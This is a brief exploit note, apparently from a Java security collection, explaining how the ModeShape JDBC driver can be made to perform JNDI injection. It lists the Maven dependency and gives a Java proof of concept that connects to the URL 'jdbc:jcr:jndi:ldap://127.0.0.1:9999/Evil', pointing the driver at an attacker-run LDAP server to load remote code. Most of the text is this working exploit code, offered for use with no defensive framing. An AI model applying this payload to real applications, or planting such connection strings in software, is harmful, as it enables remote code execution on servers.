## 原理

> [ModeShape](https://modeshape.jboss.org/) is an implementation of JCR(Java Content Repository),using JCR API to access data from other systems,e.g. filesystem, Subversion, JDBC metadata…
>
> Repository source can be configured like `jdbc:jcr:jndi:jcr:?repositoryName=repository`.
>
> So of cause we can use ModeShape to trigger JNDI Injection:

## 依赖

```xml
<dependency>
    <groupId>org.modeshape</groupId>
    <artifactId>modeshape-jdbc</artifactId>
    <version>5.0.0.Final</version>
</dependency>
```

## POC

```java
public static void main(String[] args) throws Exception{
    Class.forName("org.modeshape.jdbc.LocalJcrDriver");
    DriverManager.getConnection("jdbc:jcr:jndi:ldap://127.0.0.1:9999/Evil");
}
```

